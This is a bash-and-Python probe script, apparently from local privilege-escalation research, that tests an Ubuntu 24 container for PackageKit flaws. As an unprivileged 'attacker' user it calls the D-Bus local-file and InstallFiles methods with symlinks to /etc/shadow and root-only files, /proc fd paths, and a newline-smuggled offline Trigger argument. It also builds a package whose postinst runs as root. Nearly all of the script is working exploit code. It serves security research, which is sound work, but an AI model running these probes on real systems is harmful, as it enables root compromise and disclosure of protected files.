#!/usr/bin/env bash
set -Eeuo pipefail

TARGET="${1:-${TARGET:-ubuntu24-server-lpe-target}}"
SCRIPT_DIR="$(cd -- "$(dirname -- "${BASH_SOURCE[0]}")" && pwd)"
WORKSPACE="$(cd -- "$SCRIPT_DIR/.." && pwd)"
LOG="${LOG:-$WORKSPACE/logs/packagekit-local-file-semantics-20260517.out}"

mkdir -p "$(dirname -- "$LOG")"
printf '\n===== PackageKit local-file semantics probe run %s =====\n' "$(date '+%Y-%m-%dT%H:%M:%S%z')" >> "$LOG"
exec > >(tee -a "$LOG") 2>&1

run() {
  printf '\n$'
  printf ' %q' "$@"
  printf '\n'
  "$@"
}

echo "PackageKit/APT local-file semantics probe"
echo "target=$TARGET"
date '+%Y-%m-%dT%H:%M:%S%z'

if [[ "$(docker inspect -f '{{.State.Running}}' "$TARGET" 2>/dev/null || true)" != "true" ]]; then
  echo "target container is not running: $TARGET" >&2
  exit 1
fi

run docker exec -i "$TARGET" bash <<'TARGET_SCRIPT'
set -Eeuo pipefail

user=attacker
uid=1001
console=9
work=/tmp/packagekit-local-file-semantics
root_secret=/root/packagekit_lfs_root_secret.txt
root_deb=/root/packagekit_lfs_root_only.deb
root_marker=/root/packagekit_lfs_root_marker

backup_offline_state() {
  mkdir -p "$work/original"
  : > "$work/original/manifest"
  for p in /system-update \
           /var/lib/PackageKit/offline-update-action \
           /var/lib/PackageKit/offline-update-competed \
           /var/lib/PackageKit/prepared-update \
           /var/lib/PackageKit/prepared-upgrade; do
    if [ -L "$p" ]; then
      printf 'symlink %s %s\n' "$p" "$(readlink "$p")" >> "$work/original/manifest"
    elif [ -e "$p" ]; then
      rel="${p#/}"
      mkdir -p "$work/original/$(dirname "$rel")"
      cp -a "$p" "$work/original/$rel"
      printf 'file %s\n' "$p" >> "$work/original/manifest"
    else
      printf 'missing %s\n' "$p" >> "$work/original/manifest"
    fi
  done
}

restore_offline_state() {
  set +e
  for p in /system-update \
           /var/lib/PackageKit/offline-update-action \
           /var/lib/PackageKit/offline-update-competed \
           /var/lib/PackageKit/prepared-update \
           /var/lib/PackageKit/prepared-upgrade; do
    rm -f "$p"
  done
  [ -f "$work/original/manifest" ] || return 0
  while read -r kind p rest; do
    case "$kind" in
      file)
        rel="${p#/}"
        mkdir -p "$(dirname "$p")"
        cp -a "$work/original/$rel" "$p"
        ;;
      symlink)
        ln -s "$rest" "$p"
        ;;
    esac
  done < "$work/original/manifest"
}

cleanup_target() {
  set +e
  loginctl terminate-user "$user" >/dev/null 2>&1 || true
  systemctl start "getty@tty${console}.service" >/dev/null 2>&1 || true
  restore_offline_state
  dpkg -r pk-lfs-attacker pk-lfs-rootonly >/dev/null 2>&1 || true
  rm -f "$root_secret" "$root_deb" "$root_marker" "$root_marker".*
  rm -rf "$work"
  rm -f /var/cache/PackageKit/downloads/*pk-lfs* 2>/dev/null || true
  rm -f /var/cache/PackageKit/downloads/*packagekit_lfs* 2>/dev/null || true
  systemctl restart packagekit.service >/dev/null 2>&1 || true
  systemctl reset-failed packagekit.service polkit.service dbus.service >/dev/null 2>&1 || true
}
trap cleanup_target EXIT

echo "== pre-clean/setup =="
rm -rf "$work"
install -d -o "$user" -g "$user" -m 0700 "$work"
backup_offline_state
cleanup_target
install -d -o "$user" -g "$user" -m 0700 "$work"
backup_offline_state
loginctl terminate-user "$user" >/dev/null 2>&1 || true
systemctl stop "getty@tty${console}.service" >/dev/null 2>&1 || true

echo "== default package/service/polkit reachability proof =="
cat /etc/os-release | sed -n '1,10p'
uname -a
id attacker
id selfauth || true
getent group sudo admin wheel 2>/dev/null || true
dpkg-query -W -f='${binary:Package}\t${Version}\t${Architecture}\n' \
  packagekit packagekit-tools libpackagekit-glib2-18 gir1.2-packagekitglib-1.0 \
  apt dbus polkitd systemd dpkg python3-gi 2>&1 | sort || true
systemctl cat packagekit.service --no-pager
systemctl status packagekit.service --no-pager -l | sed -n '1,18p' || true
ls -l /run/dbus/system_bus_socket /var/run/dbus/system_bus_socket 2>/dev/null || true
busctl --system list | grep -E 'org.freedesktop.(PackageKit|PolicyKit1)|polkit' || true
python3 - <<'PY'
import xml.etree.ElementTree as ET
ids = [
    "org.freedesktop.packagekit.system-sources-refresh",
    "org.freedesktop.packagekit.trigger-offline-update",
    "org.freedesktop.packagekit.clear-offline-update",
    "org.freedesktop.packagekit.package-install-untrusted",
    "org.freedesktop.packagekit.system-update",
]
root = ET.parse("/usr/share/polkit-1/actions/org.freedesktop.packagekit.policy").getroot()
by_id = {a.attrib.get("id"): a for a in root.findall("action")}
for aid in ids:
    d = by_id[aid].find("defaults")
    vals = {c.tag: (c.text or "").strip() for c in list(d)}
    print(f"POLKIT_DEFAULT {aid} any={vals.get('allow_any')} inactive={vals.get('allow_inactive')} active={vals.get('allow_active')}")
PY
for p in /root /var/cache/PackageKit /var/cache/PackageKit/downloads /var/lib/PackageKit /var/lib/PackageKit/transactions.db; do
  stat -Lc 'STAT %A %U:%G %F %s %n' "$p" 2>&1 || true
done
grep -R -n 'method name="GetDetailsLocal"\|method name="GetFilesLocal"\|method name="InstallFiles"\|method name="GetPrepared"\|method name="Trigger"' \
  /usr/share/dbus-1/interfaces/org.freedesktop.PackageKit*.xml

echo "== build attacker and root-only local files =="
runuser -u "$user" -- bash <<'BUILD_ATTACKER'
set -Eeuo pipefail
work=/tmp/packagekit-local-file-semantics
pkg="$work/attacker-pkg"
deb="$work/pk-lfs-attacker.deb"
rm -rf "$pkg"
mkdir -p "$pkg/DEBIAN" "$pkg/usr/share/pk-lfs-attacker"
cat > "$pkg/DEBIAN/control" <<'EOF'
Package: pk-lfs-attacker
Version: 1.0
Section: misc
Priority: optional
Architecture: all
Maintainer: PackageKit LFS Probe <probe@example.invalid>
Description: PKLFS_ATTACKER_CONTROL_SENTINEL local package
 Attacker-owned local package for PackageKit local-file semantics.
EOF
cat > "$pkg/DEBIAN/postinst" <<'EOF'
#!/bin/sh
set -eu
id > /root/packagekit_lfs_root_marker.attacker_postinst
exit 0
EOF
chmod 0755 "$pkg/DEBIAN/postinst"
printf 'PKLFS_ATTACKER_DATA_SENTINEL\n' > "$pkg/usr/share/pk-lfs-attacker/payload.txt"
dpkg-deb --build "$pkg" "$deb" >/dev/null
ln -sf "$deb" "$work/link-attacker-deb"
ln -sf /root/packagekit_lfs_root_only.deb "$work/link-root-deb"
ln -sf /root/packagekit_lfs_root_secret.txt "$work/link-root-secret"
ln -sf /etc/shadow "$work/link-shadow"
printf 'PKLFS_ATTACKER_NOT_DEB_SENTINEL\n' > "$work/not-a-deb.txt"
chmod 0644 "$work/not-a-deb.txt"
ls -l "$work"
BUILD_ATTACKER

root_pkg="$work/root-pkg"
mkdir -p "$root_pkg/DEBIAN" "$root_pkg/usr/share/pk-lfs-rootonly"
cat > "$root_pkg/DEBIAN/control" <<'EOF'
Package: pk-lfs-rootonly
Version: 1.0
Section: misc
Priority: optional
Architecture: all
Maintainer: PackageKit LFS Probe <probe@example.invalid>
Description: PKLFS_ROOT_ONLY_CONTROL_SENTINEL root-only local package
 Root-only package exists only to prove whether PackageKit reads or copies
 a caller-chosen path that uid1001 cannot read directly.
EOF
cat > "$root_pkg/DEBIAN/postinst" <<'EOF'
#!/bin/sh
set -eu
id > /root/packagekit_lfs_root_marker.rootonly_postinst
exit 0
EOF
chmod 0755 "$root_pkg/DEBIAN/postinst"
printf 'PKLFS_ROOT_ONLY_DATA_SENTINEL\n' > "$root_pkg/usr/share/pk-lfs-rootonly/payload.txt"
dpkg-deb --build "$root_pkg" "$work/pk-lfs-rootonly.tmp.deb" >/dev/null
cp "$work/pk-lfs-rootonly.tmp.deb" "$root_deb"
chown root:root "$root_deb"
chmod 0600 "$root_deb"
cat > "$root_secret" <<'EOF'
PKLFS_ROOT_SECRET_TEXT_SENTINEL
This root-only text file is not a Debian archive.
EOF
chown root:root "$root_secret"
chmod 0600 "$root_secret"
rm -rf "$root_pkg" "$work/pk-lfs-rootonly.tmp.deb"
ls -l "$root_deb" "$root_secret" "$work/pk-lfs-attacker.deb"
chown -R "$user:$user" "$work"

cat > "$work/active_driver.py" <<'PYACTIVE'
#!/usr/bin/env python3
import hashlib
import os
import sqlite3
import stat
import subprocess
import sys
import time
import traceback

import gi
gi.require_version("Gio", "2.0")
from gi.repository import Gio, GLib

BUS = "org.freedesktop.PackageKit"
ROOT = "/org/freedesktop/PackageKit"
PK = "org.freedesktop.PackageKit"
TX = "org.freedesktop.PackageKit.Transaction"
OFFLINE = "org.freedesktop.PackageKit.Offline"
PROPS = "org.freedesktop.DBus.Properties"
ONLY_DOWNLOAD = 8
WORK = "/tmp/packagekit-local-file-semantics"
ATTACKER_DEB = os.path.join(WORK, "pk-lfs-attacker.deb")
ROOT_DEB = "/root/packagekit_lfs_root_only.deb"
ROOT_SECRET = "/root/packagekit_lfs_root_secret.txt"
SENTINELS = [
    b"PKLFS_ROOT_ONLY_CONTROL_SENTINEL",
    b"PKLFS_ROOT_ONLY_DATA_SENTINEL",
    b"PKLFS_ROOT_SECRET_TEXT_SENTINEL",
    b"PKLFS_ATTACKER_CONTROL_SENTINEL",
    b"PKLFS_ATTACKER_DATA_SENTINEL",
]

conn = Gio.bus_get_sync(Gio.BusType.SYSTEM, None)

def call(path, iface, method, params=None, timeout=30000):
    return conn.call_sync(BUS, path, iface, method, params, None, Gio.DBusCallFlags.NONE, timeout, None)

def header(title):
    print(f"\n## {title}", flush=True)

def run_cmd(label, argv):
    header(label)
    p = subprocess.run(argv, text=True, stdout=subprocess.PIPE, stderr=subprocess.STDOUT)
    print(p.stdout.rstrip(), flush=True)
    print(f"CMD_RC {label} {p.returncode}", flush=True)

def can_authorize():
    header("active PackageKit authorization")
    for aid in (
        "org.freedesktop.packagekit.system-sources-refresh",
        "org.freedesktop.packagekit.trigger-offline-update",
        "org.freedesktop.packagekit.clear-offline-update",
        "org.freedesktop.packagekit.package-install-untrusted",
        "org.freedesktop.packagekit.system-update",
    ):
        try:
            val = call(ROOT, PK, "CanAuthorize", GLib.Variant("(s)", (aid,)), 5000).unpack()[0]
            print(f"CAN_AUTHORIZE {aid} -> {val}", flush=True)
        except Exception as exc:
            print(f"CAN_AUTHORIZE_ERROR {aid} {exc!r}", flush=True)

def offline_snapshot(label):
    header(f"offline snapshot {label}")
    try:
        props = call(ROOT, PROPS, "GetAll", GLib.Variant("(s)", (OFFLINE,)), 5000).unpack()[0]
        for k, v in props.items():
            print(f"OFFLINE_PROP {k}={v}", flush=True)
    except Exception as exc:
        print(f"OFFLINE_PROPS_ERROR {exc!r}", flush=True)
    for p in ("/system-update", "/var/lib/PackageKit/offline-update-action",
              "/var/lib/PackageKit/offline-update-competed", "/var/lib/PackageKit/prepared-update",
              "/var/lib/PackageKit/prepared-upgrade"):
        try:
            st = os.lstat(p)
            mode = oct(stat.S_IMODE(st.st_mode))
            if stat.S_ISLNK(st.st_mode):
                print(f"OFFLINE_FILE {p} symlink mode={mode} uid={st.st_uid} gid={st.st_gid} target={os.readlink(p)!r}", flush=True)
            elif stat.S_ISREG(st.st_mode):
                try:
                    data = open(p, "rb").read(200)
                except Exception as exc:
                    data = f"READ_ERROR {exc!r}".encode()
                print(f"OFFLINE_FILE {p} file mode={mode} uid={st.st_uid} gid={st.st_gid} size={st.st_size} data={data!r}", flush=True)
            else:
                print(f"OFFLINE_FILE {p} other mode={mode} uid={st.st_uid} gid={st.st_gid}", flush=True)
        except FileNotFoundError:
            print(f"OFFLINE_FILE {p} missing", flush=True)
        except Exception as exc:
            print(f"OFFLINE_FILE {p} error={exc!r}", flush=True)
    try:
        ret = call(ROOT, OFFLINE, "GetPrepared", None, 5000)
        print(f"OFFLINE_GET_PREPARED {ret.unpack() if ret else None}", flush=True)
    except Exception as exc:
        print(f"OFFLINE_GET_PREPARED_ERROR {exc!r}", flush=True)

def db_snapshot(label):
    header(f"transaction db {label}")
    p = "/var/lib/PackageKit/transactions.db"
    try:
        st = os.stat(p)
        print(f"DB_STAT mode={oct(stat.S_IMODE(st.st_mode))} uid={st.st_uid} gid={st.st_gid} size={st.st_size}", flush=True)
        con = sqlite3.connect(f"file:{p}?mode=ro", uri=True)
        for row in con.execute("select transaction_id, role, data, description, uid, cmdline from transactions order by timespec desc limit 30"):
            text = repr(row)
            if "pk-lfs" in text or "/root/" in text or "packagekit_lfs" in text:
                print(f"DB_TX_ROW {text}", flush=True)
        for tbl in ("config", "last_action", "proxy"):
            rows = list(con.execute(f"select * from {tbl} order by 1 limit 20"))
            print(f"DB_TABLE {tbl} rows={len(rows)}", flush=True)
    except Exception as exc:
        print(f"DB_ERROR {exc!r}", flush=True)

def read_cache(label):
    header(f"download cache {label}")
    base = "/var/cache/PackageKit/downloads"
    try:
        entries = sorted(os.listdir(base))
    except Exception as exc:
        print(f"CACHE_LIST_ERROR {exc!r}", flush=True)
        return
    print(f"CACHE_ENTRIES {entries!r}", flush=True)
    for name in entries:
        path = os.path.join(base, name)
        try:
            st = os.lstat(path)
            mode = oct(stat.S_IMODE(st.st_mode))
            kind = "symlink" if stat.S_ISLNK(st.st_mode) else "file" if stat.S_ISREG(st.st_mode) else "other"
            print(f"CACHE_STAT {kind} mode={mode} uid={st.st_uid} gid={st.st_gid} size={st.st_size} path={path}", flush=True)
            if stat.S_ISLNK(st.st_mode):
                print(f"CACHE_LINK {path} -> {os.readlink(path)!r}", flush=True)
            if stat.S_ISREG(st.st_mode):
                data = open(path, "rb").read()
                print(f"CACHE_SHA256 {path} {hashlib.sha256(data).hexdigest()} first={data[:120]!r}", flush=True)
                for sentinel in SENTINELS:
                    if sentinel in data:
                        print(f"CACHE_SENTINEL_FOUND {sentinel.decode()} path={path}", flush=True)
        except Exception as exc:
            print(f"CACHE_ENTRY_ERROR {path} {exc!r}", flush=True)

def work_snapshot(label):
    header(f"attacker workdir {label}")
    for root, dirs, files in os.walk(WORK):
        dirs[:] = sorted(dirs)
        for name in sorted(files + dirs):
            p = os.path.join(root, name)
            try:
                st = os.lstat(p)
                mode = oct(stat.S_IMODE(st.st_mode))
                if stat.S_ISLNK(st.st_mode):
                    detail = f"-> {os.readlink(p)!r}"
                else:
                    detail = ""
                print(f"WORK_STAT mode={mode} uid={st.st_uid} gid={st.st_gid} size={st.st_size} path={p} {detail}", flush=True)
            except Exception as exc:
                print(f"WORK_STAT_ERROR {p} {exc!r}", flush=True)

def tx_call(label, method, signature, args, wait_s=18):
    header(f"tx {label}")
    tx = None
    sub = None
    done = {"v": False}
    try:
        tx = call(ROOT, PK, "CreateTransaction", None, 10000).unpack()[0]
        print(f"TX_PATH {label} {tx}", flush=True)
        try:
            before = call(tx, PROPS, "GetAll", GLib.Variant("(s)", (TX,)), 5000).unpack()[0]
            print(f"TX_PROPS_BEFORE {label} {before}", flush=True)
        except Exception as exc:
            print(f"TX_PROPS_BEFORE_ERROR {label} {exc!r}", flush=True)

        def sig(_conn, _sender, _path, _iface, signal, params):
            unpacked = params.unpack()
            print(f"TX_SIGNAL {label} {signal} {unpacked!r}", flush=True)
            if signal in ("Finished", "ErrorCode"):
                done["v"] = True
                GLib.timeout_add(300, loop.quit)

        sub = conn.signal_subscribe(BUS, TX, None, tx, None, Gio.DBusSignalFlags.NONE, sig)
        try:
            call(tx, TX, method, GLib.Variant(signature, args), 30000)
            print(f"TX_METHOD_OK {label} {method}", flush=True)
        except GLib.Error as exc:
            print(f"TX_METHOD_ERROR {label} {method} {exc.message}", flush=True)
            return

        loop = GLib.MainLoop()
        GLib.timeout_add_seconds(wait_s, loop.quit)
        loop.run()
        print(f"TX_DONE {label} done={done['v']}", flush=True)
        try:
            after = call(tx, PROPS, "GetAll", GLib.Variant("(s)", (TX,)), 5000).unpack()[0]
            print(f"TX_PROPS_AFTER {label} {after}", flush=True)
        except Exception as exc:
            print(f"TX_PROPS_AFTER_ERROR {label} {exc!r}", flush=True)
    except Exception:
        print(f"TX_EXCEPTION {label}", flush=True)
        traceback.print_exc()
    finally:
        if sub is not None:
            conn.signal_unsubscribe(sub)

def root_trigger_probe():
    header("offline trigger no prepared update")
    for action in ("reboot", "reboot\n/root/packagekit_lfs_root_only.deb", "/tmp/packagekit-local-file-semantics/pk-lfs-attacker.deb"):
        try:
            ret = call(ROOT, OFFLINE, "Trigger", GLib.Variant("(s)", (action,)), 10000)
            print(f"OFFLINE_TRIGGER_OK action={action!r} ret={ret.unpack() if ret else None}", flush=True)
        except GLib.Error as exc:
            print(f"OFFLINE_TRIGGER_ERROR action={action!r} {exc.message}", flush=True)
        offline_snapshot(f"after-trigger-{action!r}")
        try:
            call(ROOT, OFFLINE, "Cancel", None, 5000)
            print("OFFLINE_CANCEL_OK", flush=True)
        except Exception as exc:
            print(f"OFFLINE_CANCEL_ERROR {exc!r}", flush=True)

def main():
    header("active session")
    print(f"uid={os.getuid()} gid={os.getgid()} groups={os.getgroups()} tty={os.ttyname(0) if os.isatty(0) else 'notty'}", flush=True)
    print(f"XDG_SESSION_ID={os.environ.get('XDG_SESSION_ID')}", flush=True)
    os.system(f"loginctl show-session {os.environ.get('XDG_SESSION_ID','')} -p Id -p User -p Name -p Seat -p TTY -p Active -p State -p Type -p Class -p Remote")
    can_authorize()
    run_cmd("direct root-only read attempts", ["bash", "-c", "for p in /root/packagekit_lfs_root_only.deb /root/packagekit_lfs_root_secret.txt /etc/shadow /tmp/packagekit-local-file-semantics/link-root-deb /tmp/packagekit-local-file-semantics/link-root-secret /tmp/packagekit-local-file-semantics/link-shadow; do echo ===$p; stat -Lc '%A %U:%G %F %s %n' \"$p\" 2>&1 || true; head -c 80 \"$p\" 2>&1 || true; echo; done"])
    offline_snapshot("before")
    db_snapshot("before")
    read_cache("before")
    work_snapshot("before")

    proc_fd_path = None
    fd = os.open(ATTACKER_DEB, os.O_RDONLY)
    proc_fd_path = f"/proc/{os.getpid()}/fd/{fd}"
    cases = [
        ("attacker-deb", ATTACKER_DEB),
        ("attacker-deb-symlink", os.path.join(WORK, "link-attacker-deb")),
        ("attacker-proc-fd", proc_fd_path),
        ("root-deb-direct", ROOT_DEB),
        ("root-deb-symlink", os.path.join(WORK, "link-root-deb")),
        ("root-secret-direct", ROOT_SECRET),
        ("root-secret-symlink", os.path.join(WORK, "link-root-secret")),
        ("shadow-direct", "/etc/shadow"),
        ("shadow-symlink", os.path.join(WORK, "link-shadow")),
        ("attacker-not-deb", os.path.join(WORK, "not-a-deb.txt")),
    ]
    for label, path in cases:
        tx_call(f"details-{label}", "GetDetailsLocal", "(as)", ([path],), wait_s=12)
        tx_call(f"files-{label}", "GetFilesLocal", "(as)", ([path],), wait_s=12)

    for label, path in cases:
        tx_call(f"installfiles-only-download-{label}", "InstallFiles", "(tas)", (ONLY_DOWNLOAD, [path]), wait_s=22)
        read_cache(f"after-only-download-{label}")
        db_snapshot(f"after-only-download-{label}")
        offline_snapshot(f"after-only-download-{label}")

    for label, path in (("root-deb-direct-real", ROOT_DEB), ("root-deb-symlink-real", os.path.join(WORK, "link-root-deb"))):
        tx_call(f"installfiles-real-{label}", "InstallFiles", "(tas)", (0, [path]), wait_s=12)

    root_trigger_probe()
    read_cache("final")
    db_snapshot("final")
    offline_snapshot("final")
    work_snapshot("final")
    os.close(fd)
    print("ACTIVE_DRIVER_DONE", flush=True)

if __name__ == "__main__":
    try:
        main()
    except Exception:
        traceback.print_exc()
        sys.exit(1)
PYACTIVE
chmod 0755 "$work/active_driver.py"
chown "$user:$user" "$work/active_driver.py"

cat > "$work/active-runner.sh" <<'SHRUN'
#!/usr/bin/env bash
set -Eeuo pipefail
exec > /tmp/packagekit-local-file-semantics/active-user.out 2>&1
exec python3 /tmp/packagekit-local-file-semantics/active_driver.py
SHRUN
chmod 0755 "$work/active-runner.sh"
chown "$user:$user" "$work/active-runner.sh"

echo "== launch active uid1001 PackageKit local-file probe =="
systemctl restart packagekit.service >/dev/null 2>&1 || true
set +e
timeout 720 openvt -c "$console" -s -f -w -- runuser -l "$user" -c "$work/active-runner.sh" > "$work/openvt.out" 2>&1
openvt_rc=$?
set -e
echo "openvt_rc=$openvt_rc"
loginctl terminate-user "$user" >/dev/null 2>&1 || true
systemctl start "getty@tty${console}.service" >/dev/null 2>&1 || true

echo "== active uid1001 transcript =="
cat "$work/active-user.out" 2>&1 || true
if grep -q 'ACTIVE_DRIVER_DONE' "$work/active-user.out" 2>/dev/null; then
  echo "ACTIVE_DRIVER_COMPLETED=1"
else
  echo "ACTIVE_DRIVER_COMPLETED=0"
fi
echo
echo "== openvt transcript =="
cat "$work/openvt.out" 2>&1 || true

echo
echo "== root-side post-run proof =="
for p in "$root_marker" "$root_marker".attacker_postinst "$root_marker".rootonly_postinst; do
  if [ -e "$p" ]; then
    echo "ROOT_MARKER_PRESENT $p"
    ls -l "$p"
    cat "$p"
  else
    echo "ROOT_MARKER_ABSENT $p"
  fi
done
dpkg-query -W -f='INSTALLED ${binary:Package}\t${Version}\n' pk-lfs-attacker pk-lfs-rootonly 2>&1 || true

echo
echo "== root-side cache reachability and content proof =="
find /var/cache/PackageKit/downloads -maxdepth 1 -mindepth 1 -printf 'CACHE_ROOT %M %u:%g %s %p -> %l\n' 2>/dev/null | sort || true
python3 - <<'PY'
import hashlib
import os
import stat
import subprocess
sentinels = [
    b"PKLFS_ROOT_ONLY_CONTROL_SENTINEL",
    b"PKLFS_ROOT_ONLY_DATA_SENTINEL",
    b"PKLFS_ROOT_SECRET_TEXT_SENTINEL",
    b"PKLFS_ATTACKER_CONTROL_SENTINEL",
    b"PKLFS_ATTACKER_DATA_SENTINEL",
]
base = "/var/cache/PackageKit/downloads"
for name in sorted(os.listdir(base)):
    p = os.path.join(base, name)
    st = os.lstat(p)
    print(f"CACHE_ROOT_STAT mode={oct(stat.S_IMODE(st.st_mode))} uid={st.st_uid} gid={st.st_gid} size={st.st_size} path={p}")
    r = subprocess.run(["runuser", "-u", "attacker", "--", "test", "-r", p])
    print(f"CACHE_UID1001_READABLE path={p} rc={r.returncode}")
    if stat.S_ISREG(st.st_mode):
        data = open(p, "rb").read()
        print(f"CACHE_ROOT_SHA256 path={p} sha256={hashlib.sha256(data).hexdigest()} first={data[:120]!r}")
        for s in sentinels:
            if s in data:
                print(f"CACHE_ROOT_SENTINEL_FOUND {s.decode()} path={p}")
PY

echo
echo "== root-side transaction db rows mentioning probe/root paths =="
python3 - <<'PY'
import os
import sqlite3
import stat
p = "/var/lib/PackageKit/transactions.db"
st = os.stat(p)
print(f"DB_ROOT_STAT mode={oct(stat.S_IMODE(st.st_mode))} uid={st.st_uid} gid={st.st_gid} size={st.st_size}")
con = sqlite3.connect(p)
for row in con.execute("select transaction_id, role, data, description, uid, cmdline from transactions order by timespec desc limit 120"):
    text = repr(row)
    if "pk-lfs" in text or "/root/" in text or "packagekit_lfs" in text:
        print(f"DB_ROOT_ROW {text}")
PY

echo
echo "== root-side offline/prepared state before cleanup =="
for p in /system-update /var/lib/PackageKit/offline-update-action /var/lib/PackageKit/offline-update-competed /var/lib/PackageKit/prepared-update /var/lib/PackageKit/prepared-upgrade; do
  if [ -L "$p" ]; then
    echo "OFFLINE_ROOT symlink $p -> $(readlink "$p")"
  elif [ -e "$p" ]; then
    ls -l "$p"
    sed -n '1,40p' "$p" 2>/dev/null || true
  else
    echo "OFFLINE_ROOT missing $p"
  fi
done

echo
echo "== root-owned files under attacker workdir =="
find "$work" -xdev \( ! -uid "$uid" -o -type l \) -printf 'WORK_ROOT_CHECK %M %u:%g %s %p -> %l\n' 2>/dev/null | sort || true

echo
echo "== packagekit journal tail =="
journalctl -u packagekit.service --no-pager -n 120 || true

echo
echo "== cleanup verification =="
cleanup_target
for p in "$work" "$root_secret" "$root_deb" "$root_marker" "$root_marker".attacker_postinst "$root_marker".rootonly_postinst /system-update /var/lib/PackageKit/offline-update-action /var/lib/PackageKit/offline-update-competed /var/lib/PackageKit/prepared-update /var/lib/PackageKit/prepared-upgrade; do
  if [ -e "$p" ] || [ -L "$p" ]; then
    echo "CLEANUP_REMAINS $p"
    ls -ld "$p" 2>/dev/null || true
  else
    echo "CLEANUP_ABSENT $p"
  fi
done
find /var/cache/PackageKit/downloads -maxdepth 1 -name '*pk-lfs*' -printf 'CLEANUP_CACHE_REMAINS %p\n' 2>/dev/null || true
find /var/cache/PackageKit/downloads -maxdepth 1 -name '*packagekit_lfs*' -printf 'CLEANUP_CACHE_REMAINS %p\n' 2>/dev/null || true
dpkg-query -W pk-lfs-attacker pk-lfs-rootonly 2>&1 || true
ps -eo pid,ppid,user,stat,args | grep -E 'packagekit-local-file-semantics|active_driver|openvt|runuser -l attacker' | grep -v grep || true
loginctl list-sessions --no-legend || true
systemctl is-active packagekit.service polkit.service dbus.service 2>&1 || true
systemctl is-system-running || true
systemctl --failed --no-legend || true
TARGET_SCRIPT

echo
echo "Host log: $LOG"
